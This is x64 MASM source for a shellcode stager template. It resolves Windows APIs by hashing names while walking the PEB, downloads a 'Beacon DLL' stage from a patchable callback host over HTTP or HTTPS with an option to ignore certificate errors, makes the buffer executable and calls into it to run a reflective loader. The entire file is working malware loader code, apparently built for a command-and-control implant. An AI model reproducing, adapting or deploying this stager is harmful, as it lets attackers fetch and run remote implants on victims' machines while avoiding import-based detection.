; x64 WinINet HTTP/HTTPS PIC stager template.
;
; Build flow:
;   1. Build this MASM source as a tiny PE with main at .text RVA 0x1000.
;   2. Extract the .text section as stager_template_x64.bin.
;   3. Patch the STG2 config block in that raw bin.
;
; Runtime flow:
;   1. Resolve all APIs by walking the PEB; no imports/IAT are used.
;   2. Download a stage with WinINet.
;   3. Mark the downloaded buffer RX and call its base address.
;
; Stage contract:
;   The downloaded stage is a Beacon DLL blob whose DOS header already contains
;   the REFLoader jump stub, so the stager executes the downloaded base directly.

HASH_KERNEL32_LOADLIBRARYA          equ 076B474E6h
HASH_KERNEL32_VIRTUALALLOC          equ 0FEB867E0h
HASH_KERNEL32_VIRTUALPROTECT        equ 0A1270F81h
HASH_KERNEL32_FLUSHICACHE           equ 0A1515FD8h
HASH_NTDLL_RTLEXITUSERTHREAD        equ 06E40E90Fh
HASH_NTDLL_RTLEXITUSERPROCESS       equ 06C43A7B5h

HASH_WININET_INTERNETOPENA          equ 0B65AFFFEh
HASH_WININET_INTERNETCONNECTA       equ 0BFEC2E99h
HASH_WININET_HTTPOPENREQUESTA       equ 02FCE5EC7h
HASH_WININET_HTTPSENDREQUESTA       equ 061CE28C8h
HASH_WININET_INTERNETREADFILE       equ 0C4C42BB5h
HASH_WININET_INTERNETSETOPTIONA     equ 08D2C80D0h

STAGER_FLAG_HTTPS                   equ 00000001h
STAGER_FLAG_IGNORE_CERT             equ 00000002h

STAGER_EXIT_THREAD                  equ 1
STAGER_EXIT_PROCESS                 equ 2

INTERNET_SERVICE_HTTP               equ 3
INTERNET_FLAG_RELOAD                equ 080000000h
INTERNET_FLAG_NO_CACHE_WRITE        equ 004000000h
INTERNET_FLAG_SECURE                equ 000800000h
INTERNET_FLAG_IGNORE_CERT_CN        equ 000001000h
INTERNET_FLAG_IGNORE_CERT_DATE      equ 000002000h
INTERNET_FLAG_NO_UI                 equ 000000200h
INTERNET_OPTION_SECURITY_FLAGS      equ 31
SECURITY_FLAGS_IGNORE_CERT          equ 000003300h

MEM_COMMIT_RESERVE                  equ 000003000h
PAGE_READWRITE                      equ 04h
PAGE_EXECUTE_READ                   equ 20h

LOCAL_FRAME_SIZE                    equ 040h

.code

main proc
    ; PIC/shellcode prologue. The stager may be entered from an arbitrary
    ; loader, so normalize direction flag and align the stack before API calls.
    cld
    and rsp, 0FFFFFFFFFFFFFFF0h
    sub rsp, LOCAL_FRAME_SIZE
    mov rbp, rsp

    ; Locals:
    ; [rbp+00h] DWORD bytes_read
    ; [rbp+08h] DWORD old_protect
    ; [rbp+10h] DWORD security_flags

    ; Dynamically load WinINet. Kernel32 is already loaded in a normal process,
    ; so resolving LoadLibraryA via the PEB resolver is enough.
    lea rcx, wininet_dll
    mov r10d, HASH_KERNEL32_LOADLIBRARYA
    call GetProcAddrByHash
    test rax, rax
    jz failure
    sub rsp, 20h
    call rax
    add rsp, 20h
    test rax, rax
    jz failure

    ; Create the root WinINet handle.
    ; InternetOpenA(NULL, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0)
    xor ecx, ecx
    xor edx, edx
    xor r8d, r8d
    xor r9d, r9d
    mov r10d, HASH_WININET_INTERNETOPENA
    call GetProcAddrByHash
    test rax, rax
    jz failure
    sub rsp, 30h
    mov qword ptr [rsp+20h], 0
    call rax
    add rsp, 30h
    test rax, rax
    jz failure
    mov r12, rax

    ; Connect to the patched callback host/port. For HTTPS, WinINet still uses
    ; INTERNET_SERVICE_HTTP here; TLS is selected later by HttpOpenRequest flags.
    ; InternetConnectA(hInternet, host, port, NULL, NULL, HTTP, 0, 0)
    mov rcx, r12
    lea rdx, cfg_callback_host
    mov r8d, dword ptr [cfg_callback_port]
    xor r9d, r9d
    mov r10d, HASH_WININET_INTERNETCONNECTA
    call GetProcAddrByHash
    test rax, rax
    jz failure
    sub rsp, 40h
    mov qword ptr [rsp+20h], 0
    mov qword ptr [rsp+28h], INTERNET_SERVICE_HTTP
    mov qword ptr [rsp+30h], 0
    mov qword ptr [rsp+38h], 0
    call rax
    add rsp, 40h
    test rax, rax
    jz failure
    mov r13, rax

    ; Build the GET request. HTTP and HTTPS share this path; cfg_flags decides
    ; whether INTERNET_FLAG_SECURE and certificate-ignore flags are added.
    ; HttpOpenRequestA(hConnect, "GET", object_path, NULL, NULL, NULL, flags, 0)
    mov rcx, r13
    lea rdx, http_get
    lea r8, cfg_object_path
    xor r9d, r9d
    mov r10d, HASH_WININET_HTTPOPENREQUESTA
    call GetProcAddrByHash
    test rax, rax
    jz failure

    mov r11d, INTERNET_FLAG_RELOAD or INTERNET_FLAG_NO_CACHE_WRITE
    test dword ptr [cfg_flags], STAGER_FLAG_HTTPS
    jz open_request_flags_ready
    or r11d, INTERNET_FLAG_SECURE
    test dword ptr [cfg_flags], STAGER_FLAG_IGNORE_CERT
    jz open_request_flags_ready
    or r11d, INTERNET_FLAG_IGNORE_CERT_CN or INTERNET_FLAG_IGNORE_CERT_DATE or INTERNET_FLAG_NO_UI

open_request_flags_ready:
    sub rsp, 40h
    mov qword ptr [rsp+20h], 0
    mov qword ptr [rsp+28h], 0
    mov qword ptr [rsp+30h], r11
    mov qword ptr [rsp+38h], 0
    call rax
    add rsp, 40h
    test rax, rax
    jz failure
    mov r14, rax

    ; Optional HTTPS certificate-error suppression for self-signed test servers.
    ; This is controlled by STAGER_FLAG_IGNORE_CERT.
    test dword ptr [cfg_flags], STAGER_FLAG_IGNORE_CERT
    jz skip_security_options
    mov dword ptr [rbp+10h], SECURITY_FLAGS_IGNORE_CERT
    mov rcx, r14
    mov edx, INTERNET_OPTION_SECURITY_FLAGS
    lea r8, [rbp+10h]
    mov r9d, 4
    mov r10d, HASH_WININET_INTERNETSETOPTIONA
    call GetProcAddrByHash
    test rax, rax
    jz skip_security_options
    sub rsp, 20h
    call rax
    add rsp, 20h

skip_security_options:
    ; HttpSendRequestA(hRequest, NULL, 0, NULL, 0)
    mov rcx, r14
    xor edx, edx
    xor r8d, r8d
    xor r9d, r9d
    mov r10d, HASH_WININET_HTTPSENDREQUESTA
    call GetProcAddrByHash
    test rax, rax
    jz failure
    sub rsp, 30h
    mov qword ptr [rsp+20h], 0
    call rax
    add rsp, 30h
    test eax, eax
    jz failure

    ; Allocate a RW staging buffer. The buffer is changed to RX after download
    ; to avoid leaving it RWX.
    ; VirtualAlloc(NULL, stage_max_size, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
    xor ecx, ecx
    mov edx, dword ptr [cfg_stage_max_size]
    mov r8d, MEM_COMMIT_RESERVE
    mov r9d, PAGE_READWRITE
    mov r10d, HASH_KERNEL32_VIRTUALALLOC
    call GetProcAddrByHash
    test rax, rax
    jz failure
    sub rsp, 20h
    call rax
    add rsp, 20h
    test rax, rax
    jz failure
    mov rbx, rax
    xor r12d, r12d

download_more:
    ; Download loop. r12 tracks total bytes written. The loop is bounded by
    ; cfg_stage_max_size so a bad server cannot overrun the allocation.
    mov eax, dword ptr [cfg_stage_max_size]
    sub eax, r12d
    jbe failure
    mov r8d, dword ptr [cfg_read_chunk_size]
    test r8d, r8d
    jnz chunk_size_ready
    mov r8d, 8192

chunk_size_ready:
    cmp r8d, eax
    cmova r8d, eax
    mov dword ptr [rbp+00h], 0

    ; InternetReadFile(hRequest, stage_base + total, chunk, &bytes_read)
    mov rcx, r14
    lea rdx, [rbx+r12]
    lea r9, [rbp+00h]
    mov r10d, HASH_WININET_INTERNETREADFILE
    call GetProcAddrByHash
    test rax, rax
    jz failure
    sub rsp, 20h
    call rax
    add rsp, 20h
    test eax, eax
    jz failure

    mov eax, dword ptr [rbp+00h]
    test eax, eax
    jz download_done
    add r12, rax
    jmp download_more

download_done:
    test r12, r12
    jz failure

    ; Make the downloaded stage executable only after all bytes are received.
    ; VirtualProtect(stage_base, total_size, PAGE_EXECUTE_READ, &old_protect)
    mov rcx, rbx
    mov rdx, r12
    mov r8d, PAGE_EXECUTE_READ
    lea r9, [rbp+08h]
    mov r10d, HASH_KERNEL32_VIRTUALPROTECT
    call GetProcAddrByHash
    test rax, rax
    jz failure
    sub rsp, 20h
    call rax
    add rsp, 20h
    test eax, eax
    jz failure

    ; Flush CPU instruction cache before transferring execution.
    ; FlushInstructionCache((HANDLE)-1, stage_base, total_size)
    or rcx, 0FFFFFFFFFFFFFFFFh
    mov rdx, rbx
    mov r8, r12
    mov r10d, HASH_KERNEL32_FLUSHICACHE
    call GetProcAddrByHash
    test rax, rax
    jz failure
    sub rsp, 20h
    call rax
    add rsp, 20h

    ; Execute downloaded Beacon.dll DOS-head stub as stage(NULL).
    ; The stage's first bytes should be the patched MZ stub. The stub then
    ; dispatches to REFLoader(LPVOID), which maps the DLL and calls DllMain.
    xor ecx, ecx
    sub rsp, 20h
    call rbx
    add rsp, 20h
    jmp stager_exit

failure:

stager_exit:
    ; The post-Beacon exit policy is patched by the operator:
    ;   1 exit current thread, 2 exit whole process.
    mov eax, dword ptr [cfg_exit_mode]
    cmp eax, STAGER_EXIT_PROCESS
    je exit_process

exit_thread:
    xor ecx, ecx
    mov r10d, HASH_NTDLL_RTLEXITUSERTHREAD
    call GetProcAddrByHash
    test rax, rax
    jz hard_stop
    sub rsp, 20h
    call rax
    jmp hard_stop

exit_process:
    xor ecx, ecx
    mov r10d, HASH_NTDLL_RTLEXITUSERPROCESS
    call GetProcAddrByHash
    test rax, rax
    jz hard_stop
    sub rsp, 20h
    call rax
    jmp hard_stop

hard_stop:
    jmp hard_stop

; Resolve API by Rot15(module_hash) + Rot15(function_hash).
;
; Module hashing:
;   - Uses BaseDllName from the PEB loader list.
;   - Treats the UNICODE_STRING as bytes and uppercases ASCII lowercase bytes.
;
; Function hashing:
;   - Uses exported ASCII names exactly as stored in the export table.
;
; Input : r10d = combined target hash.
; Output: rax  = function VA, or NULL.
GetProcAddrByHash proc
    push rbx
    push rcx
    push rdx
    push r8
    push r9
    push rsi
    push rdi
    push r12
    push r13
    push r14
    push r15

    ; PEB->Ldr->InMemoryOrderModuleList
    xor eax, eax
    mov r11, qword ptr gs:[60h]
    mov r11, qword ptr [r11+18h]
    lea r14, [r11+20h]
    mov rdi, qword ptr [r14]

next_module:
    cmp rdi, r14
    jne hash_current_module
    xor eax, eax
    jmp resolve_done

hash_current_module:
    ; Hash LDR_DATA_TABLE_ENTRY.BaseDllName.
    mov rsi, qword ptr [rdi+50h]
    movzx ecx, word ptr [rdi+48h]
    xor r8d, r8d
    test ecx, ecx
    jz advance_module

hash_module_name:
    xor eax, eax
    lodsb
    cmp al, 'a'
    jb hash_module_char
    cmp al, 'z'
    ja hash_module_char
    sub al, 20h

hash_module_char:
    ror r8d, 15
    add r8d, eax
    loop hash_module_name

    ; r13d = module hash; rbx = module base.
    mov r13d, r8d
    mov rbx, qword ptr [rdi+20h]
    test rbx, rbx
    jz advance_module

    ; Locate the PE64 export directory.
    mov eax, dword ptr [rbx+3ch]
    add rax, rbx
    cmp word ptr [rax+18h], 20Bh
    jne advance_module

    mov eax, dword ptr [rax+88h]
    test eax, eax
    jz advance_module
    lea r12, [rbx+rax]

    mov ecx, dword ptr [r12+18h]
    mov r9d, dword ptr [r12+20h]
    add r9, rbx

next_function:
    test ecx, ecx
    jz advance_module
    dec ecx

    ; Iterate AddressOfNames backwards, hash each export name, then add the
    ; previously computed module hash.
    mov esi, dword ptr [r9+rcx*4]
    add rsi, rbx
    xor r8d, r8d

hash_function_name:
    xor eax, eax
    lodsb
    test al, al
    jz hash_function_done
    ror r8d, 15
    add r8d, eax
    jmp hash_function_name

hash_function_done:
    add r8d, r13d
    cmp r8d, r10d
    jne next_function

    ; Convert name index -> ordinal -> function RVA -> function VA.
    mov r11d, dword ptr [r12+24h]
    add r11, rbx
    movzx ecx, word ptr [r11+rcx*2]
    mov r11d, dword ptr [r12+1ch]
    add r11, rbx
    mov eax, dword ptr [r11+rcx*4]
    add rax, rbx
    jmp resolve_done

advance_module:
    mov rdi, qword ptr [rdi]
    jmp next_module

resolve_done:
    pop r15
    pop r14
    pop r13
    pop r12
    pop rdi
    pop rsi
    pop r9
    pop r8
    pop rdx
    pop rcx
    pop rbx
    ret
GetProcAddrByHash endp

; Static strings and the STG2 block live in .text deliberately. Keeping all
; runtime data in .text makes the extracted section self-contained shellcode.
wininet_dll db 'wininet.dll', 0
http_get    db 'GET', 0

align 8
stager_config label byte
; STG2 config layout:
;   magic[4], version, flags, callback_port, stage_max_size, read_chunk_size,
;   exit_mode, callback_host[128], object_path[128]
cfg_magic           db 'STG2'
cfg_version         dd 1
cfg_flags           dd 0
cfg_callback_port   dd 80
cfg_stage_max_size  dd 00400000h
cfg_read_chunk_size dd 8192
cfg_exit_mode       dd STAGER_EXIT_THREAD
cfg_callback_host   db '127.0.0.1', 0
                    db 118 dup(0)
cfg_object_path     db '/assets/stg_default/stage.bin', 0
                    db 98 dup(0)

main endp
end
